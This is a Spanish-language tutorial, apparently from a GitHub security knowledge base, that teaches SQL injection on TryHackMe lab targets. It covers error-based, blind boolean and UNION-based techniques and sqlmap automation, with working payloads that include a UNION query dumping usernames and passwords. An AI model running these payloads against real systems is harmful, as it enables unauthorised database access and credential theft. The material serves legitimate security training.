![kb_0](https://user-images.githubusercontent.com/88755387/132330127-79c86075-5dca-4bd0-ae77-e51a5eb59401.png)

## __Summary__

- [__Conceptos básicos del lenguaje SQL__](#Conceptos-básicos-del-lenguaje-SQL)
    - [__Conceptos de SQLi__](#Conceptos-de-SQLi)
- [__¿Qué es SQLi?__](#¿Qué-es-SQLi?)
- [__Como detectarlo__](#Como-detectarlo)
    - [__Manual - PHP parameter__](#Manual---PHP-parameter)
    - [__Automatic - Damn Small SQLi Scanner__](#Automatic---Damn-Small-SQLi-Scanner)
    - [__Automatic - suIP.biz__](#Automatic---suIP.biz)
- [__Error Based SQLi [basado en errores]__](#Error-Based-SQLi-[basado-en-errores])
    - [__Manual exploitation - SQLi Labs__](#Manual-exploitation---SQLi-Labs)
- [__Boolean Based SQLi [basado en booleanos]__](#Boolean-Based-SQLi-[basado-en-booleanos])
    - [__Blind query breaking - SQLi Labs [consultas a ciegas]__](#Blind-query-breaking---SQLi-Labs)
    - [__Explotación__](#Explotación)
- [__Union Based SQLi [basado en uniones]__](#Union-Based-SQLi-[basado-en-uniones])
    - [__Enfoque__](#Enfoque)
        - [__Determinar el número de columnas necesarias en un ataque de UNION de inyección SQL__](#Determinar-el-número-de-columnas-necesarias-en-un-ataque-de-UNION-de-inyección-SQL)
        - [__Encontrar columnas con un tipo de datos útil en un ataque de UNION de inyección SQL__](#Encontrar-columnas-con-un-tipo-de-datos-útil-en-un-ataque-UNION-de-inyección-SQL)
        - [__Usar un ataque de UNION de inyección SQL para encontrar información interesante__](#Usar-un-ataque-de-UNION-de-inyección-SQL-para-encontrar-información-interesante)
    - [__Práctica__](#Práctica)
- [__Explotación automática__](#Explotación-automática) 
    - [__SQLmap__](#SQLmap)
    - [__Burpsuite + SQLmap__](#Burpsuite-+-SQLmap)
- [__What's next?__](#What's-next?)

# __Conceptos básicos del lenguaje SQL__

"Una base de datos es una colección organizada de datos, generalmente almacenados y a los que se accede electrónicamente desde un sistema informático." Hay muchos tipos de bases de datos diferentes, como MySQL, PostgreSQL, etc.

SQL en sí mismo es un lenguaje específico de dominio que se utiliza en la programación para administrar bases de datos mediante la lectura de datos operativos.

## __Conceptos de SQLi__

Para comprender SQLi, primero debemos comprender algunos conceptos básicos del lenguaje SQL. En lo que respecta a SQLi, nos centramos principalmente en obtener información de la base de datos.

En SQL, para elegir algunos datos, usamos SELECT, FROM y WHERE. Como sabemos, SELECT nos permite seleccionar un objeto de la base de datos (FROM) y elegir un dato específico usando WHERE.

Por ejemplo, si tenemos una base de datos llamada colores y queremos seleccionar todos los colores de la lista, usaríamos esta sintaxis:

```
SELECT * FROM colors;
```

O si tenemos una base de datos de alimentos con diferentes comidas seguidas de calorías, podemos elegir todas las comidas con más de 50 calorías:

```
SELECT * FROM food WHERE calories > 50;
```

Si quereis continuar aprendiendo sobre SQL os dejo el siguiente enlace el cual es un curso de [Khan Academy](https://www.khanacademy.org/computing/computer-programming/sql).

# __¿Qué es SQLi?__

Un ataque de SQL injection consiste en la inyección de una SQL query a la aplicación web remota. 

Un exploit de inyección SQL exitoso puede leer datos confidenciales de la base de datos (usernames & passwords), modificar los datos de la base de datos (Add/Delete), ejecutar operaciones de administración en la base de datos (como cerrar la base de datos) y, en algunos casos, ejecutar comandos en el sistema operativo.

Las SQLi injections ponen la confidencialidad del servidor en alto riesgo y pueden permitir eludir los procesos de autenticación o incluso obtener acceso a cuentas con muchos privilegios.

Echemos un vistazo a esta sencilla función de entrada de PHP:

```php
<?php
    $username = $_GET['username']; // h4ns
    $result = mysql_query("SELECT * FROM users WHERE username ='$username'");
?>
```

Si miramos la variable `$username`, en condiciones normales de funcionamiento, podríamos esperar que el parámetro username sea un nombre de usuario real. La función toma un nombre de usuario y elige los datos relacionados con él en la base de datos de los usuarios.

Un usuario malintencionado puede enviar diferentes tipos de datos. Por ejemplo, ¿qué pasa si ingresamos `'`? (Single quote). La aplicación se bloqueará porque la consulta SQL resultante es incorrecta.

![sql comilla](https://user-images.githubusercontent.com/88755387/132259792-2be6e49f-a5d2-4ba3-95ec-44f5195e379a.png)

Como podemos ver aquí, ingresado `'` simplemente crea triple `'''` y produce un error. De hecho, este error puede generar información confidencial o simplemente dar una pista sobre la estructura de la base de datos.

Pero... que pasa si intentamos ingresar `' OR 1=1`?

![or11](https://user-images.githubusercontent.com/88755387/132259918-51c5510b-2df3-46bb-8534-ef83ee2071ce.png)

Esto producirá un escenario diferente. 1=1 se trata como `true` en el lenguaje SQL y, por lo tanto, nos devolverá todas las filas de la tabla.

`' --` también hará un trabajo aquí. Este payload transforma un nombre de usuario en una cadena vacía para salir de la consulta y luego agrega un comentario (--) que oculta la segunda comilla simple haciendo que la base de datos devuelva información.

# __Como detectarlo__

## __Manual - PHP parameter__

Como vimos anteriormente, SQL injection se lleva a cabo introduciendo una entrada maliciosa para secuestrar una SQL query. El ejemplo más común es abusar de un parámetro PHP GET (por ejemplo, `$username o $id`) en la URL de una página web vulnerable. Por lo general, se encuentran en los campos de búsqueda y las páginas de inicio de sesión.

Entonces, después de obtener todos los parámetros GET de PHP y las páginas de inicio de sesión, podemos proceder a detectar SQLi. Vamos a provocar un cierto error mostrando al menos un pequeño mensaje de error (que incluso puede revelar alguna información, como el tipo de base de datos).

Las pruebas que vamos a ver a continuación son sacadas de un lab de la plataforma de TryHackMe.

Lo primero que tenemos que hacer es navegar al siguiente enlace:

```
http://10.10.225.47/sqli-labs/Less-1/
```

![sqli1](https://user-images.githubusercontent.com/88755387/132260945-dda52bb2-deb0-4c87-9c18-2273f257d4f3.png)

Como podemos comprobar la propia página nos da una pista de lo que tenemos que introducir en el parámetro ID, el cual es un número.

```
http://10.10.225.47/sqli-labs/Less-1/index.php?id=1
```

Si introducimos el número `1` como valor de ID genera un nombre de usuario y contraseña estándar, pero eso no es algo que estamos buscando.

![sqli2](https://user-images.githubusercontent.com/88755387/132261149-07eec449-bb38-43fb-a9ae-c3b035d917f5.png)

 Vamos a ingresar un apóstrofe en lugar del 1.

```
http://10.10.225.47/sqli-labs/Less-1/index.php?id='
```

![sqli3](https://user-images.githubusercontent.com/88755387/132261198-5a2eca37-5c29-401c-b91b-6cf79b35c9fa.png)

¡Bingo! ¡Pudimos crear un error, por lo tanto, exponiendo que el parámetro ID es vulnerable a SQLi! También pudimos ver que el mensaje de error exponía el tipo de base de datos: MySQL.

## __Automatic - Damn Small SQLi Scanner__

En este caso vamos a hacer uso de la herramienta [DSSS](https://github.com/stamparm/DSSS).

Damn Small SQLi Scanner es un pequeño script de python que nos permite verificar la vulnerabilidad de SQLi. Simplemente tenemos que proporcionar un enlace al parámetro PHP para ejecutarlo.

```bash
python3 dsss.py -u "URL" # Main syntax
```

Simplemente ejecutamos el script contra `http://10.10.225.47/sqli-labs/Less-1/index.php?id=` y veamos que sucede.

![sqli4](https://user-images.githubusercontent.com/88755387/132261558-d0d1d754-cdcb-45a4-8e9d-39236e094f1b.png)

No solo detectó la vulnerabilidad, sino que nos proporcionó el tipo de base de datos y sugirió posibles tipos de explotación.

## __Automatic - suIP.biz__

Esta es una [herramienta](https://suip.biz/?act=sqlmap) basada en sqlmap online que nos permite realizar una verificación rápida de SQLi. Desafortunadamente, no podemos ejecutarlo en nuestra máquina, pero esta herramienta puede ser muy útil en las pruebas del mundo real.

# __Error Based SQLi [basado en errores]__

## __Definición__

Error-based SQLi es una técnica de SQL injection que se basa en mensajes de error que se utilizan para recuperar información confidencial. En algunos casos, la error-based SQL injection por sí sola es suficiente para que un atacante enumere una base de datos completa.

## __Enfoque__

Entonces, como se ve en la definición, en realidad queremos crear un error de SQL, mostrando algo de contenido sensible. Como vimos anteriomente, pudimos obtener el tipo de base de datos creando un error. Ahora tenemos que ir más allá y conseguir algo más interesante.

## __Manual exploitation - SQLi Labs__

Repetimos el mismo paso de antes introduciendo `id=1`, vamos a investigar que nos encontramos.

![sqli2](https://user-images.githubusercontent.com/88755387/132261149-07eec449-bb38-43fb-a9ae-c3b035d917f5.png)

Cuando ponemos el parámetro id como un valor, instantáneamente obtenemos un nombre de inicio de sesión y una contraseña. Pensemos en eso en términos de lenguaje SQL.

Así se vería en términos de lenguaje SQL:

```
select login_name, password from table where id=
```

Podemos comprobar que con solo mirar la salida básica, pudimos recuperar algunos patrones SQL comunes. Ahora, como parte del error-based SQLi, podemos aprovecharlo.

Ahora intentamos ingresar `1'` como parámetro de id y vamos a analizar el error de cerca.

![sqli5](https://user-images.githubusercontent.com/88755387/132262013-53b4f2cf-9ddd-4d91-bb58-52610e0494de.png)

```
syntax to use near ''1'' LIMIT 0,1' at line 1
```

Podemos ver que la aplicación web está produciendo un error debido a cuatro comillas simples alrededor del 1. Entendemos ese error como una comilla simple "extra" que no puede ser reconocida por el sistema.

¿Qué quiero decir con eso? Bueno, en este caso, cuando la aplicación toma el input id, la coloca entre dos comillas simples así:

```
' 1 ' 
```

Pero cuando ingresamos `1'` producimos este escenario:

```
' 1' '
```

De alguna manera estamos cerrando la primera comilla simple, al mismo tiempo que creamos la tercera.

Esto más adelante, hace que el sistema cierre automáticamente el tercero, monstrando el error `syntax to use near ''1''`.

Bueno, si podemos cerrar las comillas simples con tanta facilidad, significa que podemos salir de la consulta y proporcionar comandos personalizados.

Si intentamos poner `AND 1=1` (que corresponde al valor true) después de la comilla simple, todavía obtenemos este error.

Para evitar eso, necesitamos corregir la consulta. Se hace comentando el resto usando `--` y proporcionando `+` como espacio en blanco al final.

```
http://10.10.225.47/sqli-labs/Less-1/index.php?id=1' AND 1=1 --+
```

![sqli2](https://user-images.githubusercontent.com/88755387/132261149-07eec449-bb38-43fb-a9ae-c3b035d917f5.png)

¡Perfecto! La aplicación web nos muestra contenido a pesar de que inyectamos un código SQL personalizado que no debería estar disponible para nosotros.

![sqlcode](https://user-images.githubusercontent.com/88755387/132262774-0a811821-380f-4ee2-9941-a26723dfa627.png)

Entonces, para resumir, en la error-based SQLi injection, primero necesitamos encontrar un enlace o formulario de entrada donde podamos crear un error. Luego, al ingresar elementos aleatorios como comillas simples o dobles, barras o barras invertidas, necesitamos comprender el patrón común y descubrir la estructura básica de la consulta SQL. Después de eso, simplemente abusamos de nuestros conocimientos adquiridos para explotar la aplicación y obtener lo que queriamos desde un principio.

# __Boolean Based SQLi [basado en booleanos]__

## __Definición__

La boolean-based SQL injection se basa en enviar una consulta SQL a la base de datos, lo que obliga a la aplicación a devolver un resultado diferente dependiendo de si la consulta dio un resultado TRUE o FALSE. Dependiendo del resultado, el contenido de la respuesta HTTP cambiará o seguirá siendo el mismo (el cambio en la respuesta HTTP generalmente significa una respuesta FALSE, mientras que TRUE no afecta nada). Esto permite que un atacante comprenda si el payload utilizado devolvió true or false, aunque no se devuelvan datos de la base de datos.

## __Enfoque__

El boolean-based SQLi generalmente se lleva a cabo en una situación ciega. Ciego, en este caso, significa que no hay una salida real y que no podemos ver ningún mensaje de error (como hicimos anteriormente).

## __Blind query breaking - SQLi Labs__

Antes de nada vamos a navegar al siguiente enlace:

```
http://10.10.192.40/sqli-labs/Less-8/?id=
```

Ingresar comillas simples o dobles no produce ningún resultado, al igual que las barras. Esto nos da la idea de la ceguera de nuestra SQL injection (o incluso la ausencia de vulnerabilidad). En esta situación, tendremos que adivinar prácticamente la consulta y explotar la base de datos de inmediato.

Si introducimos en valor 1, vemos el siguiente mensaje:

``` 
You are in........
```

Ahora, supongamos a ciegas que es lo mismo que vimos anteriormente, poner `1'` como valor de id produciría algún error.

![sqli6](https://user-images.githubusercontent.com/88755387/132264098-742c5482-6c86-4742-96b1-974935094d4f.png)

¡Y así fue! No vemos el mensaje de error, pero este desaparece, lo que significa que en realidad pudimos producir algún tipo de error. Ahora, corrijamos la consulta poniendo  `--+`.

```
http://10.10.192.40/sqli-labs/Less-8/?id=1' --+
```

![sqli7](https://user-images.githubusercontent.com/88755387/132264159-8819c120-8782-45d1-9251-cc47f80131b3.png)

¡Perfecto! El mensaje está de vuelta. Viendo lo que sucedió aquí, aunque no podemos ver ninguna salida de SQL, al hacer una suposición simple, pudimos encontrar un patrón similar a uno visto anteriormente.

Pero la diferencia es que sqli booleano se basa en el concepto de relación True-False. Veamos cómo funciona aquí.

Ponemos `OR 1` en la URL (representando el valor True):

```
http://10.10.192.40/sqli-labs/Less-8/?id=1' OR 1 --+
```

![sqli7](https://user-images.githubusercontent.com/88755387/132264159-8819c120-8782-45d1-9251-cc47f80131b3.png)

Seguimos viendo el mensaje.

Poniendo `OR 0` no mostrará el mensaje, lógicamente, lo que demuestra nuestra capacidad para realizar un ataque de SQL injection.

## __Explotación__

Ahora que solo podemos devolver True (Your are in........) o False (sin mensaje) statements tenemos que empezar a jugar al juego del `yes-no` con la base de datos. Haciendo 'preguntas' sobre la longitud de la base de datos y la cantidad de la tabla, podremos volcar y enumerar la base de datos.

En este punto, es importante entender que en lenguaje SQL podemos usar `=`, `<`,`>` para comparar valores.

Intentamos poner diferentes valores de comparación en nuestro enlace:

```
http://10.10.192.40/sqli-labs/Less-8/?id=1' OR 1 < 2 --+    <-- True
http://10.10.192.40/sqli-labs/Less-8/?id=1' OR 1 > 2 --+    <-- False
```

Esta comparación puede ser realmente útil para hacernos esas 'preguntas'.

Para este caso en particular, intentemos obtener el nombre de la base de datos mediante una blind SQL injection.

En el lenguaje sql, hay una función realmente útil llamada `SUBSTR()` que extrae una substring de una string (comenzando en cualquier posición).

Toma 3 valores de entrada:

1. Texto operado (en nuestro caso el nombre de la base de datos)
2. Carácter para empezar
3. Número de caracteres para extraer

Por ejemplo, ejecutando `SELECT SUBSTR("Strange Fox", 5, 3)` nos va a devolver `nge`.

Entonces, nuestro SQLi payload se vería así:

```bash 
AND (substr((select database()),1,1)) # esto nos devolverá el primer carácter del nombre de la base de datos
```

Ahora, lo que tenemos que hacer es, literalmente, adivinar el carácter tratando de comparar ese payload con algunas letras.

Teoricamente, nuestro payload se vería así:
```
1' substr((select database()),1,1)) = s --+
```

Afortunadamente para nosotros, hay una manera de evitar el uso de caracteres y acelerar las cosas (en lugar de fuzzear todo el abecedario). Si agregamos la función `ascii()` antes del payload, podremos compararla con los valores de los caracteres ASCII.

```
http://10.10.192.40/sqli-labs/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```

![sqli7](https://user-images.githubusercontent.com/88755387/132264159-8819c120-8782-45d1-9251-cc47f80131b3.png)

Aparece debido a que la letra `s` en ASCII es `115`.

Por supuesto, en el mundo real no podemos simplemente adivinar eso, por lo que debemos usar los operadores > y < para comparar el valor de los caracteres con sus valores ASCII.

# __Union Based SQLi [basado en uniones]__

## __Definición__

Union-based SQLi es una técnica de SQL injection que aprovecha el operador UNION SQL para combinar los resultados de dos o más declaraciones SELECT en un solo resultado que luego se devuelve como parte de la respuesta HTTP.

## __Enfoque__

La keyword UNION nos permite ejecutar una o más consultas SELECT adicionales y agregar los resultados a la consulta original. Por ejemplo:

```
SELECT 1, 2 FROM usernames UNION SELECT 1, 2 FROM passwords
```

Esta SQL query devolverá un único resultado tomado de 2 columnas: primera y segunda posición de nombres de usuario y contraseñas.

El ataque UNION SQLi consta de 3 etapas:

1. Debemos determinar el número de columnas que podemos recuperar.
2. Nos aseguramos de que las columnas que encontramos estén en un formato adecuado.
3. Atacamos y obtenemos algunos datos interesantes.

### __Determinar el número de columnas necesarias en un ataque de UNION de inyección SQL__

Hay exactamente dos formas de detectar una:

La primera implica inyectar una serie de consultas `ORDER BY` hasta que se produzca un error. Por ejemplo:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on until an error occurs
```

The last value before the error would indicate the number of columns.

El segundo, implicaría enviar una serie de payloads de `UNION SELECT` con una serie de valores NULL:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
# until the error occurs
```

Ningún error = el número de NULL coincide con el número de columnas.

### __Encontrar columnas con un tipo de datos útil en un ataque de UNION de inyección SQL__

Generalmente, los datos interesantes que deseamos recuperar estarán en forma de cadena. Después de haber determinado el número de columnas requeridas (por ejemplo, 4), podemos probar cada columna para testear si puede contener string data reemplazando una de los UNION SELECT payloads con un string value. En caso de 4, enviaríamos:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Ningún error = el tipo de datos es útil para nosotros (string).

### __Usar un ataque de UNION de inyección SQL para encontrar información interesante__

Cuando hayamos determinado el número de columnas y encontramos qué columnas pueden contener string data, finalmente podemos comenzar a recuperar datos interesantes.

Suponemos que:

- Los dos primeros pasos mostraron exactamente dos columnas existentes con el tipo de datos útil.
- La base de datos contiene una tabla llamada users con las columnas: username & passwords.

En esta situación, podemos recuperar el contenido de la tabla del user enviando el siguiente input:

```
' UNION SELECT username, password FROM users --
```

## __Práctica__

Navegamos a la siguiente dirección:

```
http://10.10.9.161:3000
```

y nos encontramos con un pequeño laboratorio altamente vulnerable, con muchas configuraciones erróneas y errores del desarrollador.

Primero vamos a `http://10.10.9.161:3000/resetdb.php` para resetear nuestra base de datos.

Luego vamos a `http://10.10.9.161:3000/register.php` y nos registramos con una cuenta nueva. 

Ahora pasemos al objetivo principal: explotar la aplicación web. Un campo de búsqueda vulnerable se encuentra en `http://10.10.9.161:3000/searchproducts.php`.

![sqli8](https://user-images.githubusercontent.com/88755387/132319875-56a5687f-81a7-4858-a223-60ebb67b804c.png)

¡Comencemos nuestro proceso de explotación!

Como recordamos, primero debemos determinar el número de columnas disponibles ingresando una serie de `'UNION SELECT NULL --` en el campo de búsqueda.

El desarrollador de la room ha configurado la base de datos para que lance un error cuando se pongan `--` al final de la línea. Para bypassearlo, debemos incluir un comentario adicional después de `--`. Podemos usar `//` o `/*` para omitir esa configuración.

![sqli9](https://user-images.githubusercontent.com/88755387/132321445-5a83137b-cbb5-4237-83f4-f5ab85cd6c11.png)

Como podemos ver en la captura de pantalla anterior, un solo valor NULL provoca un error, lo que significa que hay más columnas. Intentemos ingresar valores NULL hasta que finalmente obtengamos el número.

```
' UNION SELECT NULL,NULL,NULL,NULL,NULL -- //
```

El número de columnas es de 5.

Ahora, intentemos ingresar `h4ns` en lugar de valores NULL aleatorios y veamos si hay un error. Un error indicará que el formato de columna dado no es adecuado para nosotros y no puede ser explotado.

![sqli10](https://user-images.githubusercontent.com/88755387/132322929-0232d25a-5881-454b-8bad-81a78f86ee62.png)

Finalmente, podemos comenzar a obtener información valiosa. Simplemente reemplacemos algunos valores nulos con SQL keywords para obtener información sobre la base de datos.
Aquí hay una pequeña lista:

- database()
- user()
- @@version
- username
- password
- table_name
- column_name

Si queremos dumpear el nombre de todos los usuarios y sus respectivas contraseñas tenemos que mandar el siguiente payload:

```
' UNION SELECT NULL, id, username, password, fname FROM users -- //
```

![sqli10](https://user-images.githubusercontent.com/88755387/132323913-0b16cbf8-0fd2-4a27-bad0-e5db3df8cf69.png)

# __Explotación automática__

## __SQLmap__

Instalación rápida:

```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

A continuación os dejo una tabla con los parámetros más importantes:

![sqli22](https://user-images.githubusercontent.com/88755387/132325481-c2d7b56e-bd46-4da0-89d7-dc7cc08e998d.png)

Volvemos al primer lab para lanzar la herramienta:

```
sqlmap --url "http://10.10.37.123/sqli-labs/Less-1/index.php?id=" --batch
```

![sqli11](https://user-images.githubusercontent.com/88755387/132326650-ffa6caa0-bb6d-478e-b973-e59795dca2f8.png)

¡SQLmap ha obtenido bastante info! Tipo de base de datos, posible tipo de inyección e incluso nos proporcionó información del sistema operativo.

## __Burpsuite + SQLmap__

![sqli12](https://user-images.githubusercontent.com/88755387/132327179-d54ed29c-467f-4a8a-acf1-a65dd3c1ef50.png)

Capturamos esta request y la guardamos en nuestra máquina mediante `CLICK DERECHO >> SAVE ITEM`.

Nos dirigimos al directorio donde tenemos nuestra request guardada y desde ahí lanzamos la tool.

```
sqlmap -r {request} --batch
```

![sqli14](https://user-images.githubusercontent.com/88755387/132328072-eb996b99-f75b-4fc1-9787-8e089c6c2ad5.png)

Como podeis comprobar nos lanza la misma respuesta que antes.

# __What's next?__

Os dejo por aquí un listado de recursos para practicar:

## __Listas de Payloads__

https://github.com/payloadbox/sql-injection-payload-list

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## __Guías y Blogs__

https://www.sqlinjection.net/

http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

https://github.com/trietptm/SQL-Injection-Payloads

https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/

## __Labs y práctca__

https://portswigger.net/web-security/sql-injection

https://github.com/Audi-1/sqli-labs

https://github.com/appsecco/sqlinjection-training-app

### __TryHackMe__

https://tryhackme.com/room/gamezone

https://tryhackme.com/room/avengers

https://tryhackme.com/room/jurassicpark
